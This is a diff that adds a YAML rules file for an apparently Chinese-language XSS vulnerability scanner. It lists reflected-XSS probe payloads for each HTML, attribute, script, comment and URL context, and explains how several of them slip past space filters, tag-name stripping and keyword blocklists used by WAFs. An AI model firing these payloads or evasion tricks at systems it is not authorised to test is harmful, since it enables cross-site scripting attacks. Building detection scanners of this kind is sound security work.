@@ -1,0 +1,238 @@
+# XSS 检测规则。
+#
+# 这个文件只放“数据”，不放检测逻辑：
+# - marker：注入用的唯一标记前后缀
+# - 各上下文（HTML 文本、RAWTEXT 标签、属性、JS、注释、URL）对应的探测 payload
+# - WAF 拦截识别指纹（和 SQL 插件的思路一致，独立一份，互不影响）
+#
+# 检测流程在 xss_scanner.py，上下文识别在 context.py，通过 rules.py 读取这里的内容。
+#
+# payload 里的占位符：
+#   {marker}      唯一随机标记，例如 psr9k3xz
+#   {tag}         外层标签名，RAWTEXT 上下文用来生成 </tag> 闭合序列
+#   {value}       参数原始值（一般不用，直接用 marker 替换整段值）
+
+# ----------------------------------------------------------------------
+# marker 配置
+# ----------------------------------------------------------------------
+# 反射/存储 marker 的固定前后缀。真正发送时中间会拼一段随机串，
+# 保证 baseline 里不可能自带这个 marker，出现即说明是我们注入的。
+marker:
+  # 反射型探针一：先只放这个纯字母数字 marker，用来定位反射点，
+  # 纯字母数字不会被任何编码改变，便于稳定定位。
+  reflect_prefix: "psr"
+  reflect_suffix: "xz"
+  # 存储型 marker 前缀。存储型要能跨请求回扫，所以额外用一个可辨识前缀。
+  stored_prefix: "psst"
+  stored_suffix: "xz"
+  # 探测闭合字符时，marker 前后各放一段字母数字“哨兵”，
+  # 方便在响应里精确定位这段 payload，并检查中间的特殊字符有没有被编码。
+  boundary_left: "qq"
+  boundary_right: "ww"
+
+# ----------------------------------------------------------------------
+# 反射型：按上下文的闭合探测 payload
+# ----------------------------------------------------------------------
+# 每个上下文一组，组里有多条 payload，按顺序尝试，命中即停。
+# 检测逻辑对每条 payload：
+# 1. 把参数值替换成 payload（{marker} 换成本次随机 marker，{tag} 换成外层标签名）。
+# 2. 在响应里找两个 marker 之间的片段（也就是我们注入的闭合序列）。
+# 3. 检查该片段里 required_chars 列出的关键字符是否“原样、未被实体编码”地出现。
+#    全部原样出现 -> 该上下文可被打破 -> 判定 XSS。
+#
+# 没有单独的 WAF/tamper 阶段：所有“变形/绕过”手段都直接写进这里的基础 payload，
+# 主动检测时全部用上。判定看的是结构字符（< > " ' ; 等）是否存活，与标签名无关，
+# 所以覆盖面主要靠“不同结构闭合方式”和“绕过后端过滤的写法”来拓宽：
+# - 不同标签/事件：img/onerror、svg/onload、body/details，以及通用无害标签 <pp9>
+#   （后端按标签名删除 <img>/<svg> 时，<pp9> 仍能让 < > 存活，照样命中）。
+# - 无空格变形：<img/src=x/onerror=...>，绕过基于空格的过滤。
+# - 不同闭合方式：起新标签 / 只闭合引号加事件处理器 / 闭合 </script> / 闭合 RAWTEXT 标签 /
+#   JS 字符串拼接（不需要分号）。每条 payload 各自声明它真正依赖的 required_chars，
+#   这样某类字符被过滤时，依赖其它字符的 payload 仍可能命中。
+#
+# 干净应用命中第一条就停，只多花 1 个请求；有过滤时才逐条尝试，用请求换覆盖面。
+# method 会作为 finding 的 method。
+reflect_contexts:
+  # HTML 标签之间的文本区，例如 <div>这里</div>。能注入 < > 就能起新标签。
+  - method: reflected_html
+    context: html_text
+    payloads:
+      - payload: "{marker}<img src=x onerror=alert(1)>{marker}"
+        required_chars: ["<", ">"]
+        sample: "<img src=x onerror=alert(1)>"
+      - payload: "{marker}<svg onload=alert(1)>{marker}"
+        required_chars: ["<", ">"]
+        sample: "<svg onload=alert(1)>"
+      - payload: "{marker}<img/src=x/onerror=alert(1)>{marker}"
+        required_chars: ["<", ">"]
+        sample: "<img/src=x/onerror=alert(1)>  (无空格，绕空格过滤)"
+      - payload: "{marker}<pp9>{marker}"
+        required_chars: ["<", ">"]
+        sample: "任意标签均可，如 <img src=x onerror=alert(1)> (绕按标签名删除的过滤)"
+      - payload: "{marker}<a href=javascript:alert(1)>x</a>{marker}"
+        required_chars: ["<", ">"]
+        sample: "<a href=javascript:alert(1)>x</a>"
+      - payload: "{marker}<details open ontoggle=alert(1)>{marker}"
+        required_chars: ["<", ">"]
+        sample: "<details open ontoggle=alert(1)>"
+
+  # RAWTEXT / RCDATA 标签内，例如 <textarea>这里</textarea>、<title>这里</title>。
+  # 这类标签里 <script> 不会被当标签解析，必须先用 </标签> 闭合当前标签才能逃逸。
+  # {tag} 会替换成实际外层标签名（textarea/title/style/...）。
+  - method: reflected_rawtext
+    context: rawtext
+    payloads:
+      - payload: "{marker}</{tag}><img src=x onerror=alert(1)>{marker}"
+        required_chars: ["<", "/", ">"]
+        sample: "</textarea><img src=x onerror=alert(1)>"
+      - payload: "{marker}</{tag}><svg onload=alert(1)>{marker}"
+        required_chars: ["<", "/", ">"]
+        sample: "</title><svg onload=alert(1)>"
+      - payload: "{marker}</{tag}><pp9>{marker}"
+        required_chars: ["<", "/", ">"]
+        sample: "</style><任意标签> (绕按标签名删除的过滤)"
+
+  # 双引号属性值，例如 <input value="这里">。
+  - method: reflected_attr_double
+    context: attr_double
+    payloads:
+      # 闭合引号 + 闭合标签 + 起新标签，最通用。
+      - payload: '{marker}"><img src=x onerror=alert(1)>{marker}'
+        required_chars: ['"', "<", ">"]
+        sample: '"><img src=x onerror=alert(1)>'
+      - payload: '{marker}"><svg onload=alert(1)>{marker}'
+        required_chars: ['"', "<", ">"]
+        sample: '"><svg onload=alert(1)>'
+      # 只闭合引号、不起新标签，靠 autofocus+onfocus 事件处理器执行。
+      # 当 < > 被过滤、但引号没被过滤时仍然可利用。
+      - payload: '{marker}" autofocus onfocus=alert(1) x="{marker}'
+        required_chars: ['"']
+        sample: '" autofocus onfocus=alert(1) x="'
+      - payload: '{marker}"><pp9>{marker}'
+        required_chars: ['"', "<", ">"]
+        sample: '"><任意标签> (绕按标签名删除的过滤)'
+
+  # 单引号属性值，例如 <input value='这里'>。
+  - method: reflected_attr_single
+    context: attr_single
+    payloads:
+      - payload: "{marker}'><img src=x onerror=alert(1)>{marker}"
+        required_chars: ["'", "<", ">"]
+        sample: "'><img src=x onerror=alert(1)>"
+      - payload: "{marker}' autofocus onfocus=alert(1) x='{marker}"
+        required_chars: ["'"]
+        sample: "' autofocus onfocus=alert(1) x='"
+      - payload: "{marker}'><pp9>{marker}"
+        required_chars: ["'", "<", ">"]
+        sample: "'><任意标签>"
+
+  # 无引号属性值，例如 <input value=这里>。
+  # 空格能引入新属性/事件；> 能闭合标签起新标签。
+  - method: reflected_attr_unquoted
+    context: attr_unquoted
+    payloads:
+      - payload: "{marker} autofocus onfocus=alert(1) x=y{marker}"
+        required_chars: [" ", "="]
+        sample: " autofocus onfocus=alert(1) x=y"
+      - payload: "{marker}><img src=x onerror=alert(1)>{marker}"
+        required_chars: [">", "<"]
+        sample: "><img src=x onerror=alert(1)>"
+      # 关键字无关：闭合标签起无害标签 <pp9>，绕按 alert/img 等关键字拦截的过滤。
+      - payload: "{marker}><pp9>{marker}"
+        required_chars: [">", "<"]
+        sample: "><任意标签>  (正文无敏感关键字)"
+
+  # <script> 块里的双引号 JS 字符串，例如 var a = "这里";
+  # 只要字符串定界引号能原样存活，就能打破字符串 -> 只依赖 " 即可判定。
+  - method: reflected_js_string_double
+    context: js_string_double
+    payloads:
+      - payload: '{marker}";alert(1)//{marker}'
+        required_chars: ['"']
+        sample: '";alert(1)//'
+      - payload: '{marker}"-alert(1)-"{marker}'
+        required_chars: ['"']
+        sample: '"-alert(1)-"  (字符串拼接，不需要分号)'
+      - payload: "{marker}</script><img src=x onerror=alert(1)>{marker}"
+        required_chars: ["</script"]
+        sample: "</script><img src=x onerror=alert(1)>  (直接逃出脚本块)"
+      # 关键字无关：正文不含 alert/script，只靠引号存活判定。
+      # 当 WAF 按子串拦 alert/script 导致上面几条整包被挡时，这条仍能过并确认。
+      - payload: '{marker}";1//{marker}'
+        required_chars: ['"']
+        sample: '";payload//  (引号可闭合字符串即可执行任意 JS，正文无敏感关键字)'
+      # 大小写混淆逃出脚本块 + 无害标签 <pp9>，全程无被拦关键字（绕大小写敏感黑名单）。
+      - payload: "{marker}</sCriPt><pp9>{marker}"
+        required_chars: ["</sCriPt", "<", ">"]
+        sample: "</sCriPt><任意标签>  (大小写混淆闭合 script，绕关键字黑名单)"
+
+  # <script> 块里的单引号 JS 字符串，例如 var a = '这里';
+  - method: reflected_js_string_single
+    context: js_string_single
+    payloads:
+      - payload: "{marker}';alert(1)//{marker}"
+        required_chars: ["'"]
+        sample: "';alert(1)//"
+      - payload: "{marker}'-alert(1)-'{marker}"
+        required_chars: ["'"]
+        sample: "'-alert(1)-'  (字符串拼接，不需要分号)"
+      - payload: "{marker}</script><svg onload=alert(1)>{marker}"
+        required_chars: ["</script"]
+        sample: "</script><svg onload=alert(1)>"
+      # 关键字无关：正文不含 alert/script，只靠引号存活判定。
+      - payload: "{marker}';1//{marker}"
+        required_chars: ["'"]
+        sample: "';payload//  (引号可闭合字符串即可执行任意 JS，正文无敏感关键字)"
+      # 大小写混淆逃出脚本块 + 无害标签，绕关键字黑名单。
+      - payload: "{marker}</sCriPt><pp9>{marker}"
+        required_chars: ["</sCriPt", "<", ">"]
+        sample: "</sCriPt><任意标签>  (大小写混淆闭合 script，绕关键字黑名单)"
+
+  # <script> 块里非字符串位置（直接拼进 JS 代码），能注入分号起新语句就可能执行。
+  - method: reflected_js_code
+    context: js_code
+    payloads:
+      - payload: "{marker};alert(1);{marker}"
+        required_chars: [";"]
+        sample: ";alert(1);"
+      - payload: "{marker}</script><img src=x onerror=alert(1)>{marker}"
+        required_chars: ["</script"]
+        sample: "</script><img src=x onerror=alert(1)>"
+      # 关键字无关：正文不含 alert/script，只靠分号能起新语句判定。
+      - payload: "{marker};1;{marker}"
+        required_chars: [";"]
+        sample: ";payload;  (可注入分号起新语句即可执行任意 JS，正文无敏感关键字)"
+      # 大小写混淆逃出脚本块 + 无害标签，绕关键字黑名单。
+      - payload: "{marker}</sCriPt><pp9>{marker}"
+        required_chars: ["</sCriPt", "<", ">"]
+        sample: "</sCriPt><任意标签>  (大小写混淆闭合 script，绕关键字黑名单)"
+
+  # HTML 注释里，例如 <!-- 这里 -->。能注入 --> 就能提前结束注释。
+  - method: reflected_comment
+    context: html_comment
+    payloads:
+      - payload: "{marker}--><img src=x onerror=alert(1)>{marker}"
+        required_chars: ["-->", "<", ">"]
+        sample: "--><img src=x onerror=alert(1)>"
+      - payload: "{marker}--><svg onload=alert(1)>{marker}"
+        required_chars: ["-->", "<", ">"]
+        sample: "--><svg onload=alert(1)>"
+      - payload: "{marker}--><pp9>{marker}"
+        required_chars: ["-->", "<", ">"]
+        sample: "--><任意标签>"
+
+  # href/src 等 URL 属性里注入 javascript: 伪协议（典型如 <a href=这里>）。
+  # 若是带引号的 URL 属性，也顺带尝试闭合引号起新标签。
+  - method: reflected_url_scheme
+    context: url_attr
+    payloads:
+      - payload: "{marker}javascript:alert(1)//{marker}"
+        required_chars: ["javascript:"]
+        sample: "javascript:alert(1)"
+      - payload: '{marker}"><img src=x onerror=alert(1)>{marker}'
+        required_chars: ['"', "<", ">"]
+        sample: '"><img src=x onerror=alert(1)>  (带引号的 URL 属性)'
+      # 关键字无关：闭合引号起无害标签，绕按 alert/img 关键字拦截的过滤。
+      - payload: '{marker}"><pp9>{marker}'
+        required_chars: ['"', "<", ">"]
+        sample: '"><任意标签>  (带引号的 URL 属性，正文无敏感关键字)'
